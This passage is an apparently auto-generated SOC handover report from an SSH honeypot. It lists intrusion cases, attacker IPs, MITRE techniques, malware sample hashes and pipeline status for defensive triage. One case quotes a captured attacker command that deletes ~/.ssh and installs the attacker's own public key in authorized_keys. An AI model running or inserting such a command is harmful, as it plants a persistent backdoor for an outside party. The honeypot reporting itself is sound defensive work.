- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-853bef852f45

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-05-01 09:29 |
| **Last Seen** | 2026-05-01 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 09:29:44` | `cowrie.session.connect` |
| `2026-05-01 09:29:44` | `cowrie.client.version` |
| `2026-05-01 09:29:44` | `cowrie.client.kex` |
| `2026-05-01 09:29:45` | `cowrie.login.success` |
| `2026-05-01 09:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01e4690f60a0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.184[.]143` |
| **First Seen** | 2026-05-01 09:45 |
| **Last Seen** | 2026-05-01 09:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 09:45:43` | `cowrie.session.connect` |
| `2026-05-01 09:45:43` | `cowrie.client.version` |
| `2026-05-01 09:45:43` | `cowrie.client.kex` |
| `2026-05-01 09:45:44` | `cowrie.login.success` |
| `2026-05-01 09:45:44` | `cowrie.session.params` |
| `2026-05-01 09:45:44` | `cowrie.command.input` |
| `2026-05-01 09:45:44` | `cowrie.command.failed` |
| `2026-05-01 09:45:44` | `cowrie.log.closed` |
| `2026-05-01 09:45:45` | `cowrie.session.params` |
| `2026-05-01 09:45:45` | `cowrie.command.input` |
| `2026-05-01 09:45:45` | `cowrie.session.file_download` |
| `2026-05-01 09:45:45` | `cowrie.log.closed` |
| `2026-05-01 09:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.184[.]143` to AbuseIPDB if not already reported
- [ ] Block `209.99.184[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-637a8ade07c8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.184[.]143` |
| **First Seen** | 2026-05-01 09:45 |
| **Last Seen** | 2026-05-01 09:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 09:45:47` | `cowrie.session.connect` |
| `2026-05-01 09:45:47` | `cowrie.client.version` |
| `2026-05-01 09:45:47` | `cowrie.client.kex` |
| `2026-05-01 09:45:48` | `cowrie.login.success` |
| `2026-05-01 09:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.184[.]143` to AbuseIPDB if not already reported
- [ ] Block `209.99.184[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.79.179[.]119` | **32** | 2026-05-01 09:22 | 2026-05-01 09:23 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `80.102.218[.]187` | **30** | 2026-05-01 07:57 | 2026-05-01 08:35 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.118[.]107` | **25** | 2026-05-01 07:52 | 2026-05-01 08:05 | 40m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.216.240[.]71` | **11** | 2026-05-01 06:40 | 2026-05-01 07:01 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `167.250.37[.]5` | **4** | 2026-05-01 06:46 | 2026-05-01 06:54 | 8m | 0 | `T1592` | 🟢 LOW |
| `18.221.100[.]43` | **3** | 2026-05-01 08:13 | 2026-05-01 08:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]204` | **2** | 2026-05-01 08:17 | 2026-05-01 08:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.196.66[.]80` | 1 | 2026-05-01 09:45 | 2026-05-01 09:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.78[.]222` | 1 | 2026-05-01 07:52 | 2026-05-01 07:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.111[.]127` | 1 | 2026-05-01 09:43 | 2026-05-01 09:45 | 96s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]98` | 1 | 2026-05-01 07:54 | 2026-05-01 07:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.41[.]249` | 1 | 2026-05-01 07:54 | 2026-05-01 07:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.167.237[.]191` | 1 | 2026-05-01 09:29 | 2026-05-01 09:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]204` | 1 | 2026-05-01 07:44 | 2026-05-01 07:45 | 32s | 1 | `T1110.001` | 🟢 LOW |
| `208.79.105[.]197` | 1 | 2026-05-01 09:10 | 2026-05-01 09:11 | 37s | 0 | `T1592` | 🟢 LOW |
| `209.99.184[.]143` | 1 | 2026-05-01 09:45 | 2026-05-01 09:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.92.139[.]163` | 1 | 2026-05-01 08:47 | 2026-05-01 08:47 | 12s | 0 | `T1592` | 🟢 LOW |
| `43.142.113[.]25` | 1 | 2026-05-01 08:44 | 2026-05-01 08:45 | 31s | 0 | `T1592` | 🟢 LOW |
| `46.29.234[.]127` | 1 | 2026-05-01 08:30 | 2026-05-01 08:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.154.4[.]151` | 1 | 2026-05-01 09:43 | 2026-05-01 09:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-05-01 07:18 | 2026-05-01 07:18 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (25 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 40/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.79.179[.]119` | BE | Google LLC | **100** ⚠️ | 0 |
| `18.221.100[.]43` | US | Amazon Technologies Inc. | **100** ⚠️ | 20 |
| `46.29.234[.]127` | LT | GLOBAL CONNECTIVITY SOLUTIONS LLP | **100** ⚠️ | 19 |
| `102.216.240[.]71` | CD | United Net 240 | **100** ⚠️ | 5 |
| `14.103.41[.]249` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `217.92.139[.]163` | DE | Deutsche Telekom AG | **100** ⚠️ | 2 |
| `209.99.184[.]143` | CH | SKN Subnet & Telecom Ltd | **100** ⚠️ | 7 |
| `8.154.4[.]151` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 35 |
| `43.142.113[.]25` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 41 |
| `190.167.237[.]191` | DO | Compañía Dominicana de Teléfonos S. A. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 97 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 55 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 16 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |

---

## 🔕 False Positive Summary (656 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 47 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 4 |
| AbuseIPDB score 23 below threshold 25 | 17 |
| AbuseIPDB score 4 below threshold 25 | 287 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 296 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 793 cases |
| Tool 34  | Credential Extractor        | ✅ 74 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 656 filtered (82.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 35 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 25 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 16 priority case(s) shown individually · 21 recon entry/entries in table (7 group(s) consolidating 107 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-01T09:50:41Z_
